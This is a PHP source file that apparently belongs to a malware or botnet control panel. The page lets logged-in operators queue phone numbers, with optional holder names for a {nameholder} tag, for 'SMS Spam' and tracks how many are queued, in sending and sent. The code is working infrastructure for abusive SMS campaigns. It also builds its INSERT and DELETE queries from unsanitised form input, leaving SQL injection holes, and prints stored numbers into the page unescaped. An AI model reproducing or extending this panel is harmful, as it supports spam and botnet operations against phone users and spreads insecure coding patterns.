<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}

	if (($_SESSION['panel_right']!="admin")&&($_SESSION['panel_right']!="user")){
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>

<div class="content">

<script type="text/javascript">
    function checkAll(checkId){
        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].type == "checkbox" && inputs[i].id == checkId) {
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                } else if (inputs[i].checked == false ) {
                    inputs[i].checked = true ;
                }
            }
        }
    }
</script>
<?php
$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');

if(strlen($_POST['text_spam'])>2){
	$strNumbers = $_POST['text_spam'];
	$strNumbers = str_replace(" ","",$strNumbers);
	$strNumbers = str_replace("-","",$strNumbers);
	$strNumbers = str_replace("(","",$strNumbers);
	$strNumbers = str_replace(")","",$strNumbers);
	$arrayNumbers = explode(',',$strNumbers);

	foreach ($arrayNumbers as $key => $value) {
			$statement = $connection->prepare("insert into smsspam (number,status) value ('$value','0')");
			$statement->execute([$value]);
	}

//INSERT INTO `smsspam`(`number`, `status`) VALUES ('12312','0')

}

?>
<div style="margin-top:10px;">
	<form name='spam' method='post'>
<center>
</br>Numbers(num1, num2, ..) or (name1/num1, name2/num2, ..)
</br>The name of the holder in the message is specified by the tag {nameholder}
</br><input type="text" name="text_spam" id="text_spam" style="color: #337ab7; background: #1D1F24; font-size: 13; height: 28px;    width: 75%; padding: 5px; font-family: 'Consolas'; border: 1px solid #ccc; border-radius: 5px;"></input>
</br><input type='submit' value='Add Numbers' name='add_numbers' style='margin-top:5px;' class='btn btn-outline-success'/>
</center>

	</form>
</div>



 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
	  <th><input type="checkbox" id="chk_new"  onclick="checkAll('chk');" /></th>
		<th>ID</th>
		<th>Name Holder/Number</th>
		<th>Status</th>
  </thead>

	<?php
    $sql = "SELECT * FROM smsspam";
		$booleanIMEI = false;

		//*****Обработка запросa Для удаления!
		if((isset($_POST["delete"])) && (isset($_POST["checks"])))
		{
			if (preg_match("/checks/",print_r($_POST,true)))
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = $id;
					$sql2 = "DELETE FROM smsspam WHERE id='".$id_del."'";
					$connection->query($sql2);
				}
			}
				header ('Location: /index.php?cont=commands');
		}

		//******батоны и переменые с базы!********
	  echo "<form method='post'>";
		$notsend=0;
		$send=0;
		$insend=0;

		foreach($connection->query($sql) as $row){
			$ID = $row['id'];
			$number = $row['number'];
			$status = $row['status'];

			$pathIcon="";
			if($status=="0"){
				$pathIcon="images/icons/sms_x.png";
				$notsend++;
			}elseif($status=="1"){
				$pathIcon="images/icons/sms_r.png";
				$insend++;
			}else{
				$pathIcon="images/icons/sms_v.png";
				$send++;
			}

			//************Данные в таблице********************************************
			  echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><input type=checkbox id='chk' name=checks[] value=$ID></input></td>
				<td>$ID</td>
				<td>$number</td>
				<td><img src=$pathIcon width='30px'/></td>
				</tr>";
		}
		echo "<p id='text_command' style='margin-top:5px; Color:#EDB749;  font-size: 13pt;'>Numbers for SMS Spam (On Queue: $notsend, Send: $send, In Sending: $insend)</p>";
	 echo "<input type='submit' value='Delete' name='delete' style='margin-left:68px; margin-top:15px;' class='btn btn-outline-danger'/>";

		 echo "</form>";

		//	id 	IMEI 	command
		?>

</table>
</div>
<?php } ?>
